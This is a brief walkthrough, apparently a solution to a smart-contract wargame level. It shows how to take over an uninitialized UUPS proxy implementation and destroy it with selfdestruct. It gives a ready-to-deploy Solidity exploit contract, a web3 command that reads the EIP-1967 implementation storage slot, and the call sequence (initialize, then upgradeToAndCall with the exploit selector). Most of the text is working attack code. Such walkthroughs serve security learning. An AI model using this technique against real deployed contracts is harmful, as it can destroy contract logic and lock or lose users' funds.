Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Engine {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract Exploit {
    function exploit () public {
        selfdestruct(payable(msg.sender));
    }

}
```
Get the address of the implementation contract
```javascript
await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
```

Interact directly with the implementation contract
- Call initialize()
- Call upgradeToAndCall(), passing the address of the Exploit contract, and the selector for the exploit() method
`0x63d9b770`
